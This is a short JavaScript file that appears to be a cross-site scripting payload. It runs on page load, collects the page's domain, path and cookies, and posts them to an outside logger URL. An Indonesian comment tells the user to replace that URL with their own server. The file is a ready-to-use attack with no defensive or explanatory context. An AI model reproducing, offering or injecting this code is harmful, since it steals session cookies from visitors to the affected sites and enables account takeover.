var url = "https://rajazeus77.my.id/logger.php"; // Ganti dengan URL server Anda

function sendToServer() {
    var data = {
        domain: document.domain,
        url: document.location.hostname + document.location.pathname,
        cookie: document.cookie
    };

    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(data));
}

sendToServer();
